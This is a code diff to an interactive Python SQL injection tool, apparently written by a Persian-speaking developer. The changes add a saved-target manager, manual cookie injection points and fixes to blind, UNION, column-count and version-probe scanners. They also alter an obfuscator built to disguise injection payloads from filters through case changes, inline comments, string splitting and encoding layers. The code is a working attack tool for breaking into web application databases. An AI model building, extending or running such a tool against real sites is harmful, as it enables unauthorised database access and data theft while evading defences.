@@ -130,7 +130,7 @@ def timed_send(ic, req, quiet: bool = False, tries_override: int = None):
 class Obfuscator:
     def __init__(self, dbms=None):
         self.encoding_policy = None
-        self.dbms = dbms or "generic"
+        self.default_intensity = 0.5
         self.techniques = {
             "case_change": self._case_change,
             "inline_comments": self._inline_comments,
@@ -144,16 +144,16 @@ class Obfuscator:
             "whitespace_tricks": self._whitespace_tricks
         }
         self.safety_rules = {
-        "preserve_token_boundaries": True,  
-        "max_length_increase": 2.0,  
-        "forbidden_patterns": [r"\/\*!\d+", r"--\s*[^\s]"],  
-        "preserve_key_positions": ["SELECT", "FROM", "WHERE", "UNION"]  
-    }
+            "preserve_token_boundaries": True,
+            "max_length_increase": 2.0,
+            "forbidden_patterns": [r"\/\*!\d+", r"--\s*[^\s]"],
+            "preserve_key_positions": ["SELECT", "FROM", "WHERE", "UNION"]
+        }
         self.token_boundaries = {
-        "start": ["'", "\"", "(", " ", "\t", "\n", ",", "=", "<", ">"],
-        "end": ["'", "\"", ")", " ", "\t", "\n", ",", ";", "--", "#", "/*"]
-    }
-        
+            "start": ["'", "\"", "(", " ", "\t", "\n", ",", "=", "<", ">"],
+            "end": ["'", "\"", ")", " ", "\t", "\n", ",", ";", "--", "#", "/*"]
+        }
+
         # DBMS-specific configurations
         self.dbms_config = {
             "MySQL": {
@@ -195,6 +195,8 @@ class Obfuscator:
                 }
             },
         }
+        # Set dbms AFTER dbms_config is defined so the validation works correctly
+        self.dbms = dbms if (dbms and dbms in self.dbms_config) else "MySQL"
 
     def _is_token_boundary(self, text, position):
         if position == 0 or position == len(text) - 1:
@@ -286,12 +288,17 @@ class Obfuscator:
         """Set default encoding policy for all obfuscations"""
         self.encoding_policy = policy
 
-    # if hasattr(self, 'encoding_policy') and self.encoding_policy:
-    #     current = self._apply_encoding_layers(current, self.encoding_policy)
+    def _get_default_config(self):
+        """Return dbms_config if available, else empty dict (used before dbms_config is set)."""
+        return getattr(self, "dbms_config", {})
 
+    def _safe_config(self):
+        """Return config for current DBMS, falling back to MySQL."""
+        dbms = self.dbms if self.dbms in self.dbms_config else "MySQL"
+        return self.dbms_config[dbms]
 
     def set_dbms(self, dbms):
-        self.dbms = dbms if dbms in self.dbms_config else "generic"
+        self.dbms = dbms if dbms in self.dbms_config else "MySQL"
 
     def _case_change(self, text, intensity=0.5):
         """Random case changing with intensity control"""
@@ -307,8 +314,8 @@ class Obfuscator:
         """Add random inline comments"""
         if not text.strip():
             return text
-            
-        config = self.dbms_config[self.dbms]
+
+        config = self._safe_config()
         words = text.split()
         result = []
         
@@ -392,8 +399,8 @@ class Obfuscator:
         """Break strings using concatenation"""
         if len(text) < 4:
             return text
-            
-        config = self.dbms_config[self.dbms]
+
+        config = self._safe_config()
         concat_op = random.choice(config["string_concat"])
         
         parts = []
@@ -439,7 +446,7 @@ class Obfuscator:
 
     def _alternative_keywords(self, text, intensity=0.3):
         """Use alternative keywords"""
-        config = self.dbms_config[self.dbms]
+        config = self._safe_config()
         words = text.split()
         result = []
         
@@ -467,22 +474,23 @@ class Obfuscator:
     def obfuscate(self, payload, techniques=None, intensity=0.5, max_iterations=3):
         if not techniques:
             techniques = list(self.techniques.keys())
-            
+
         current = payload
         applied_techniques = []
-        
+
         for _ in range(max_iterations):
-            # Randomly select a technique to apply
             technique_name = random.choice(techniques)
             if random.random() < intensity:
                 technique = self.techniques[technique_name]
                 new_payload = technique(current, intensity)
-                
-                # Only keep if it changed something
                 if new_payload != current:
                     current = new_payload
                     applied_techniques.append(technique_name)
-        
+
+        # Apply encoding policy (same as obfuscate_advanced)
+        if hasattr(self, 'encoding_policy') and self.encoding_policy:
+            current = self._apply_encoding_layers(current, self.encoding_policy)
+
         return current, applied_techniques
 
     def generate_variants(self, payload, count=5, techniques=None, intensity=0.5):
@@ -957,24 +965,44 @@ class InputCollector:
             print(f"[-] Could not fetch cookies: {e}")
         if not cookies_dict:
             print("[-] No cookies found in session.")
-            return False
+            ans = input("Add a cookie manually? (y/n): ").strip().lower()
+            if ans != "y":
+                return False
+            k = input("Cookie name: ").strip()
+            v = input("Cookie value: ").strip()
+            if not k:
+                print("[-] Empty name.")
+                return False
+            cookies_dict = {k: v}
 
         keys = list(cookies_dict.keys())
         print("\nCookies:")
         for i, k in enumerate(keys, start=1):
             print(f"{i}. {k} = {cookies_dict[k]}")
-        print("Select one/many (e.g., 1,3-4 or 'all')  |  9: Back  |  0: Cancel")
-        sel = input("Indices: ").strip()
-        if sel in ("9", "۹"): return "back"
-        if sel in ("0", "۰"): return False
-        try:
-            indices = parse_multi_indices(sel, len(keys))
-        except Exception:
-            print("[-] Invalid selection.")
-            return False
-        if not indices:
-            print("[-] Nothing selected.")
-            return False
+        print("Select one/many (e.g., 1,3-4 or 'all')  |  8: Add custom  |  9: Back  |  0: Cancel")
+        while True:
+            sel = input("Indices: ").strip()
+            if sel in ("9", "۹"): return "back"
+            if sel in ("0", "۰"): return False
+            if sel in ("8", "۸"):
+                ck = input("Cookie name: ").strip()
+                cv = input("Cookie value: ").strip()
+                if ck:
+                    cookies_dict[ck] = cv
+                    keys = list(cookies_dict.keys())
+                    print(f"[+] Added cookie: {ck}={cv}")
+                    for i, k in enumerate(keys, start=1):
+                        print(f"{i}. {k} = {cookies_dict[k]}")
+                continue
+            try:
+                indices = parse_multi_indices(sel, len(keys))
+            except Exception:
+                print("[-] Invalid selection.")
+                continue
+            if not indices:
+                print("[-] Nothing selected.")
+                continue
+            break
 
         self.selected_keys = [keys[i-1] for i in indices]
         self.original_values = {k: cookies_dict[k] for k in self.selected_keys}
@@ -1349,10 +1377,13 @@ def run_blind_user_payload(ic, obfuscator):
     throttle_short = 0.08
     throttle_long = 0.35
 
-    # time-based vars
+    # time-based vars — initialized here so they're always defined
     time_threshold = None
     time_repeats = 1
     expected_delay = None
+    time_false_threshold = None
+    early_stop = True
+    anti_cache_mode = "auto"
 
     if det_sel in ("1","۱"):
         det_mode = "tester"
@@ -1785,6 +1816,9 @@ def run_column_counter(ic):
                     print(f"[i={i}] send failed.")
                     continue
                 sample = rows[0]
+                if sample[1] is None:
+                    print(f"[i={i}] -> send failed")
+                    continue
                 print(f"[i={i}] -> status={sample[1]} len={sample[2]} hash={sample[3]} time={sample[4]:.3f}s")
 
     print("\n[UNION NULL scan]")
@@ -1799,6 +1833,9 @@ def run_column_counter(ic):
                     print(f"[cols={i}] send failed.")
                     continue
                 sample = rows[0]
+                if sample[1] is None:
+                    print(f"[cols={i}] -> send failed")
+                    continue
                 print(f"[cols={i}] -> status={sample[1]} len={sample[2]} hash={sample[3]} time={sample[4]:.3f}s")
 
 def run_datatype_tester(ic):
@@ -1854,6 +1891,9 @@ def run_datatype_tester(ic):
                     print(f"[col {i+1}] send failed.")
                     continue
                 sample = rows[0]
+                if sample[1] is None:
+                    print(f"[col {i+1}] send failed.")
+                    continue
                 print(f"[col {i+1}] status={sample[1]} len={sample[2]} hash={sample[3]} time={sample[4]:.3f}s")
 
 def run_version_probe(ic):
@@ -1914,6 +1954,9 @@ def run_version_probe(ic):
                 print(" send failed.")
                 continue
             sample = rows[0]
+            if sample[1] is None:
+                print(" send failed.")
+                continue
             print(f" status={sample[1]} len={sample[2]} hash={sample[3]} time={sample[4]:.3f}s")
 
 def run_db_info_interactive(ic):
@@ -2287,53 +2330,314 @@ def run_column_counter_advanced(ic):
     print("\n[Done] Advanced column-count scans finished. Review status/len/hash/time and decide manually.")
 
 
+# ------------------- Target Manager -------------------
+import json as _json
+
+class TargetManager:
+    """
+    ذخیره، مدیریت و انتخاب تارگت‌ها.
+    تارگت‌ها در یک فایل JSON کنار اسکریپت ذخیره می‌شن.
+    """
+    DEFAULT_FILE = os.path.join(os.path.dirname(os.path.abspath(__file__)), "targets.json")
+
+    def __init__(self, filepath: str = None):
+        self.filepath = filepath or self.DEFAULT_FILE
+        self.targets: list[dict] = []   # [{"label": str, "url": str, "note": str}]
+        self._load()
+
+    # ---------- persistence ----------
+    def _load(self):
+        if os.path.isfile(self.filepath):
+            try:
+                with open(self.filepath, "r", encoding="utf-8") as f:
+                    data = _json.load(f)
+                if isinstance(data, list):
+                    self.targets = data
+            except Exception as e:
+                print(f"[!] Could not load targets file: {e}")
+
+    def _save(self):
+        try:
+            with open(self.filepath, "w", encoding="utf-8") as f:
+                _json.dump(self.targets, f, ensure_ascii=False, indent=2)
+        except Exception as e:
+            print(f"[!] Could not save targets file: {e}")
+
+    # ---------- helpers ----------
+    def _print_list(self):
+        if not self.targets:
+            print("  (no targets saved)")
+            return
+        print(f"\n{'#':<4} {'Label':<22} {'URL':<50} Note")
+        print("-" * 90)
+        for i, t in enumerate(self.targets, 1):
+            label = (t.get("label") or "")[:20]
+            url   = (t.get("url")   or "")[:48]
+            note  = (t.get("note")  or "")[:30]
+            print(f"{i:<4} {label:<22} {url:<50} {note}")
+
+    def _find_by_label(self, label: str):
+        label_l = label.strip().lower()
+        for i, t in enumerate(self.targets):
+            if (t.get("label") or "").lower() == label_l:
+                return i
+        return -1
+
+    # ---------- public API ----------
+    def add(self, url: str, label: str = "", note: str = "") -> dict:
+        """افزودن تارگت جدید؛ اگه label تکراری بود، آپدیت می‌کنه."""
+        if not label:
+            label = f"target_{len(self.targets)+1}"
+        idx = self._find_by_label(label)
+        entry = {"label": label, "url": url, "note": note}
+        if idx >= 0:
+            self.targets[idx] = entry
+            print(f"[*] Updated existing target: {label}")
+        else:
+            self.targets.append(entry)
+            print(f"[+] Added target: {label}  ->  {url}")
+        self._save()
+        return entry
+
+    def remove(self, indices: list[int]) -> int:
+        """حذف بر اساس ایندکس ۱-based؛ برمی‌گردونه تعداد حذف‌شده‌ها."""
+        to_remove = set()
+        for i in indices:
+            if 1 <= i <= len(self.targets):
+                to_remove.add(i - 1)
+        self.targets = [t for j, t in enumerate(self.targets) if j not in to_remove]
+        self._save()
+        return len(to_remove)
+
+    def get(self, index_1based: int) -> dict | None:
+        if 1 <= index_1based <= len(self.targets):
+            return self.targets[index_1based - 1]
+        return None
+
+    def pick_interactive(self, prompt: str = "Select target") -> dict | None:
+        """
+        نمایش لیست و گرفتن انتخاب از کاربر.
+        برمی‌گردونه dict تارگت انتخاب‌شده یا None.
+        """
+        if not self.targets:
+            print("[-] No saved targets. Add one first (option T).")
+            return None
+        self._print_list()
+        print(f"\n{prompt} (number or label, 0=cancel): ", end="")
+        sel = input().strip()
+        if sel in ("0", "۰", ""):
+            return None
+        # سعی عدد
+        fa = "۰۱۲۳۴۵۶۷۸۹"; en = "0123456789"
+        sel_en = sel.translate(str.maketrans(fa, en))
+        try:
+            idx = int(sel_en)
+            t = self.get(idx)
+            if t:
+                return t
+            print("[-] Index out of range.")
+            return None
+        except ValueError:
+            pass
+        # سعی label
+        idx = self._find_by_label(sel)
+        if idx >= 0:
+            return self.targets[idx]
+        print(f"[-] No target with label '{sel}'.")
+        return None
+
+    # ---------- interactive submenu ----------
+    def run_menu(self):
+        while True:
+            print("\n==== Target Manager ====")
+            self._print_list()
+            print()
+            print("A) Add target")
+            print("E) Edit target (label/note)")
+            print("D) Delete target(s)")
+            print("I) Import targets from file (one URL per line, or JSON)")
+            print("X) Export targets list to text file")
+            print("0) Back to main menu")
+            cmd = input("> ").strip().upper()
+
+            if cmd in ("0", ""):
+                break
+
+            elif cmd == "A":
+                url = input("URL (must start with http/https): ").strip()
+                if not (url.startswith("http://") or url.startswith("https://")):
+                    print("[-] Invalid URL.")
+                    continue
+                label = input("Label (leave blank for auto): ").strip()
+                note  = input("Note/description (optional): ").strip()
+                self.add(url, label, note)
+
+            elif cmd == "E":
+                if not self.targets:
+                    print("[-] No targets.")
+                    continue
+                self._print_list()
+                try:
+                    idx = int(input("Target number to edit: ").strip())
+                    t = self.get(idx)
+                    if not t:
+                        print("[-] Invalid number.")
+                        continue
+                except Exception:
+                    print("[-] Invalid input.")
+                    continue
+                print(f"Current label: {t['label']}  |  url: {t['url']}  |  note: {t.get('note','')}")
+                new_label = input(f"New label [{t['label']}]: ").strip() or t["label"]
+                new_note  = input(f"New note [{t.get('note','')}]: ").strip()
+                if not new_note and "note" in t:
+                    new_note = t["note"]
+                self.targets[idx-1]["label"] = new_label
+                self.targets[idx-1]["note"]  = new_note
+                self._save()
+                print("[+] Updated.")
+
+            elif cmd == "D":
+                if not self.targets:
+                    print("[-] No targets.")
+                    continue
+                self._print_list()
+                sel = input("Index/range to delete (e.g. 1,3-5 or 'all'): ").strip()
+                indices = parse_multi_indices(sel, len(self.targets))
+                if not indices:
+                    print("[-] Nothing selected.")
+                    continue
+                removed = self.remove(indices)
+                print(f"[+] Removed {removed} target(s).")
+
+            elif cmd == "I":
+                path = input("File path: ").strip()
+                if not os.path.isfile(path):
+                    print("[-] File not found.")
+                    continue
+                added = 0
+                try:
+                    with open(path, "r", encoding="utf-8") as f:
+                        raw = f.read().strip()
+                    # اگه JSON بود
+                    if raw.startswith("["):
+                        items = _json.loads(raw)
+                        for item in items:
+                            if isinstance(item, dict) and item.get("url"):
+                                self.add(item["url"], item.get("label",""), item.get("note",""))
+                                added += 1
+                            elif isinstance(item, str) and item.startswith("http"):
+                                self.add(item)
+                                added += 1
+                    else:
+                        for line in raw.splitlines():
+                            line = line.strip()
+                            if line.startswith("http"):
+                                self.add(line)
+                                added += 1
+                except Exception as e:
+                    print(f"[-] Import error: {e}")
+                print(f"[+] Imported {added} target(s).")
+
+            elif cmd == "X":
+                if not self.targets:
+                    print("[-] No targets to export.")
+                    continue
+                out_path = input("Save to (blank = targets_export.txt beside script): ").strip()
+                if not out_path:
+                    out_path = os.path.join(os.path.dirname(self.filepath), "targets_export.txt")
+                try:
+                    with open(out_path, "w", encoding="utf-8") as f:
+                        for t in self.targets:
+                            f.write(f"{t.get('label','')}\t{t['url']}\t{t.get('note','')}\n")
+                    print(f"[+] Exported to: {out_path}")
+                except Exception as e:
+                    print(f"[-] Export error: {e}")
+
+            else:
+                print("[-] Unknown command.")
+
+
 # ------------------- app loop -------------------
 def main():
     ic = None
     last_prepared = {}   # label -> request dict
     last_responses = {}  # label -> response body
     obfuscator = Obfuscator()
+    targets = TargetManager()
 
     def ensure_ic():
         nonlocal ic
         while ic is None:
+            # اگه تارگت ذخیره شده داریم، اول بپرسیم از لیست بزنه یا دستی بنویسه
+            if targets.targets:
+                print("\nLoad from saved targets? (y/n, default y): ", end="")
+                ans = input().strip().lower()
+                if ans in ("", "y", "yes", "ب"):
+                    t = targets.pick_interactive("Select target to use")
+                    if t:
+                        try:
+                            ic = InputCollector(t["url"])
+                            print(f"[+] Target set: [{t['label']}] {t['url']}")
+                            return
+                        except Exception as e:
+                            print(f"[-] {e}")
+                            ic = None
+                            continue
             try:
                 url = input("Enter target URL: ").strip()
                 ic = InputCollector(url)
+                # پیشنهاد ذخیره
+                save_ans = input("Save this target? (y/n): ").strip().lower()
+                if save_ans in ("y", "yes", "ب"):
+                    label = input("Label: ").strip()
+                    note  = input("Note (optional): ").strip()
+                    targets.add(url, label, note)
             except Exception as e:
                 print(f"[-] {e}")
                 ic = None
 
     while True:
-        print("\n==== Main Menu ====")
-        print("1) Set/Change Target URL")
-        print("2) Select Target Type & Inputs (multi-select, with Back)")
-        print("3) Prepare Requests (single payload)  [supports {placeholders}]")
-        print("4) Prepare Requests (dict payloads)   [supports {placeholders}]")
-        print("5) Send Last Prepared (all, via requests)  [then optionally open in browser]")
-        print("6) Open in Browser (Playwright) one/many of last prepared")
-        print("7) Load & Run Payload Dicts from Folder (auto, optional error-scan) [supports {placeholders}]")
-        print("8) Load Error Regex Dicts & Scan Last Responses")
-        print("9) Exit")
-        print("10) Blind (user-provided payloads) on selected inputs [supports {placeholders}]")
+        cur_target = f"[{ic.url}]" if ic else "[none]"
+        print(f"\n==== Main Menu ====  current target: {cur_target}")
+        print("── Target Management ──────────────────────────────────────")
+        print("T ) Target Manager  (add / list / edit / delete saved targets)")
+        print("1 ) Set/Change Target URL  (pick from list or enter manually)")
+        print("── Input & Injection ──────────────────────────────────────")
+        print("2 ) Select Target Type & Inputs (multi-select, with Back)")
+        print("3 ) Prepare Requests (single payload)  [supports {placeholders}]")
+        print("4 ) Prepare Requests (dict payloads)   [supports {placeholders}]")
+        print("5 ) Send Last Prepared (all, via requests)  [then optionally open in browser]")
+        print("6 ) Open in Browser (Playwright) one/many of last prepared")
+        print("7 ) Load & Run Payload Dicts from Folder (auto, optional error-scan)")
+        print("8 ) Load Error Regex Dicts & Scan Last Responses")
+        print("── Scanners ───────────────────────────────────────────────")
+        print("10) Blind (user-provided payloads) on selected inputs")
         print("11) Column Count Helper (ORDER BY / UNION NULL)")
         print("12) Data Type Tester (per column)")
         print("13) DB Version Probe (UNION)")
         print("14) DB Info Interactive (UNION builder)")
         print("15) Column Count Helper (Advanced, multi-DBMS, CAST/Time/Boolean-friendly)")
+        print("── Settings ───────────────────────────────────────────────")
         print("16) Toggle Injection Mode (append/replace)  [current: {}]".format(getattr(ic, "injection_mode", "append") if ic else "append"))
         print("17) Toggle Cookie Encode Mode (auto/encode/raw)  [current: {}]".format(getattr(ic, "encode_cookies", "auto") if ic else "auto"))
         print("18) Toggle Header Encode Mode (auto/encode/raw)  [current: {}]".format(getattr(ic, "encode_headers", "auto") if ic else "auto"))
         print("19) Toggle Context Mode (raw/json/xml/html/js)  [current: {}]".format(getattr(ic, "context_mode", "raw") if ic else "raw"))
         print("20) Preview Transform of a payload on a selected input")
+        print("── Obfuscation ────────────────────────────────────────────")
         print("21) Configure Obfuscation Settings")
         print("22) Apply Obfuscation to Payload")
         print("23) Generate Multiple Obfuscated Variants")
+        print("───────────────────────────────────────────────────────────")
+        print("9 ) Exit")
         choice = input("> ").strip()
 
         if choice in ("9", "۹"):
             print("Bye.")
             break
+
+        if choice.upper() == "T":
+            targets.run_menu()
+            continue
 
         if choice in ("1", "۱"):
             ic = None
@@ -2781,29 +3085,30 @@ def main():
             # ذخیره برای استفاده بعدی
             last_obfuscated = obfuscated
             continue
-        
+
         if choice in ("23", "۲۳"):
             payload = input("Enter payload to generate variants: ").strip()
             if not payload:
                 print("[-] Empty payload")
                 continue
-                
+
             try:
                 count = int(input("Number of variants [5]: ").strip() or "5")
             except:
                 count = 5
-                
+
             try:
                 intensity = float(input("Intensity (0.0-1.0) [0.5]: ").strip() or "0.5")
             except:
                 intensity = 0.5
-                
+
             variants = obfuscator.generate_variants(payload, count, None, intensity)
             print(f"\nGenerated {len(variants)} variants:")
             for i, variant in enumerate(variants, 1):
                 print(f"\n{i}. {variant['payload']}")
                 print(f"   Techniques: {', '.join(variant['techniques'])}")
-                continue
+            continue
+
         print("[-] Invalid choice.")
         continue
 
